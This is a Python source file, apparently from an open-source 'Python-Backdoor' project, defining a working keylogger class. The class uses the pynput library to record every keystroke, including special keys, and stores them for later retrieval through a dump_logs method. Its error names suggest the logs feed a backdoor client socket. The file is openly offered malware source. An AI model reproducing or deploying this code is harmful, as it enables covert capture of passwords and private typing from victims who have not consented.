"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import threading
import pynput

from src import errors

KEY = pynput.keyboard.Key


class Keylogger:

    def __init__(self):
        self.logs = None
        self.listener = pynput.keyboard.Listener(on_press=self.on_keyboard_evt)
        self.clear()

    def on_keyboard_evt(self, evt):
        if evt == KEY.backspace:
            self.logs += " [Bck] "
        elif evt == KEY.tab:
            self.logs += " [Tab] "
        elif evt == KEY.enter:
            self.logs += "\n"
        elif evt == KEY.space:
            self.logs += " "
        elif type(evt) == KEY:  # if the character is some other type of special key
            self.logs += f" [{str(evt)[4:]}] "
        else:
            self.logs += f"{evt}"[1:len(str(evt)) - 1]

    def start(self):
        if not self.listener.running:
            self.listener.start()

    def stop(self):
        if self.listener.running:
            self.listener.stop()
            threading.Thread.__init__(self.listener)  # re-initialise the thread
            self.clear()
        else:
            raise errors.ClientSocket.KeyloggerError("Listener is not running")

    def dump_logs(self):
        if self.listener.running:
            logs = self.logs
            self.clear()
            return logs
        else:
            raise errors.ClientSocket.KeyloggerError("Listener is not running")

    def clear(self):
        self.logs = ""
